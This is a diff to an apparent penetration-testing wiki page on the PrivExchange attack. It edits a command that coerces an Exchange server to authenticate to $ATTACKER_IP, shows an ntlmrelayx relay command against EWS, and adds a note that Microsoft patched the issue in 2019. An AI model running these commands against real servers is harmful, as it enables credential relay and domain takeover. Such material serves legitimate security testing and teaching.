@@ -9,7 +9,7 @@
 [PrivExchange](https://github.com/dirkjanm/privexchange/) \(Python\) is a tool able to log in on Exchange Web Services and call that API.
 
 ```bash
-privexchange.py -d $DOMAIN -u '$DOMAIN_USER' -p '$PASSWORD' -ah $ATTACKER_IP s2012exc.testsegment.local
+privexchange.py -d $DOMAIN -u '$DOMAIN_USER' -p '$PASSWORD' -ah $ATTACKER_IP $EXCHANGE_SERVER_TARGET
 ```
 
 {% hint style="info" %}
@@ -26,6 +26,13 @@ cd /PATH/TO/impacket
 pip3 install .
 ntlmrelayx.py -t https://exchange.server.EWS/Exchange.asmx
 ```
+{% endhint %}
+
+{% hint style="warning" %}
+On February 12th 2019, Microsoft released updates for Exchange which resolved
+
+* the coerced authentication issue
+* the fact that Exchange servers had overkill permissions leading attacker to a full domain compromission.
 {% endhint %}
 
 ## References
